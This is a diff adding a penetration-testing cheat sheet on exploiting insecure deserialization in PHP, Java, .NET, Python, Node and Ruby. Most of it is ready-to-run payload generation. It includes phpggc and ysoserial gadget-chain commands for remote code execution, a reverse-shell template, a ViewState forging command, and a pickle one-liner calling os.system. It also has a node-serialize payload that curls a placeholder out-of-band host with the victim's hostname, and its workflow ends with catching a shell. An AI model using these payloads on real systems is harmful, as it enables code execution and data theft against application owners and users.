@@ -1,0 +1,40 @@
+# Insecure deserialization — spot the blob, pick the generator, deliver it.
+# Sinks: cookies, hidden form fields, params, caches, message queues, import/upload.
+
+## Spot it (by language)
+PHP    : starts with  O:<n>:"Class"  or  a:<n>:{   (serialize()).  base64 of same is common.
+Java   : base64 starting 'rO0AB'  OR raw hex 'AC ED 00 05'.  Endpoints taking java objects / RMI / JMX.
+.NET   : base64 'AAEAAAD/////'  (BinaryFormatter) ; ASP.NET __VIEWSTATE= ; LosFormatter.
+Python : base64 of pickle often starts 'gASV' / '\x80\x04' ; also 'gAJ' ; YAML with !!python/object.
+Node   : node-serialize blobs containing  _$$ND_FUNC$$_  ; also JSON revivers.
+Ruby   : Marshal blobs '\x04\x08' ; often base64.
+
+## PHP — phpggc (generator for framework gadget chains)
+phpggc -l                                   # list chains (Laravel, Symfony, Monolog, WordPress, ...)
+phpggc Monolog/RCE1 system id               # print a gadget that runs `id`
+phpggc -b Monolog/RCE1 system id            # base64 output to drop in a cookie/param
+# No framework? a custom class with __wakeup()/__destruct()/__toString() that does file ops is the gadget.
+# Example custom:  O:4:"Logr":1:{s:4:"file";s:18:"/var/www/html/s.php";}   (if __destruct writes $this->file)
+
+## Java — ysoserial (allowed payload generator)
+java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0
+java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,<b64revshell>}|{base64,-d}|bash' | base64 -w0
+# pick the chain matching the classpath (CommonsCollections 1-7, Spring, Groovy, URLDNS to just prove it):
+java -jar ysoserial.jar URLDNS http://YOUR_OAST/   # DNS/HTTP hit confirms deserialization before RCE
+
+## .NET — ysoserial.net
+ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
+# ASP.NET ViewState: if __VIEWSTATE is not MAC-protected (or key leaked), forge with:
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=<__VIEWSTATEGENERATOR> --validationkey=<key> --validationalg=SHA1
+
+## Python — pickle (only if you control the serialized input)
+python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("x",(),{"__reduce__":lambda s:(os.system,("id",))})())).decode())'
+# YAML:  !!python/object/apply:os.system ["id"]
+
+## Node — node-serialize
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR_OAST/'+require('os').hostname())}()"}
+
+## Workflow
+1) Identify the blob + language.  2) Confirm deser happens at all (URLDNS / OAST callback — no RCE risk).
+3) Match the gadget chain to the app's libraries (versions from errors, /vendor, .jar names, wpscan, etc.).
+4) Generate, base64 if the sink needs it, place in the exact field, catch your shell.
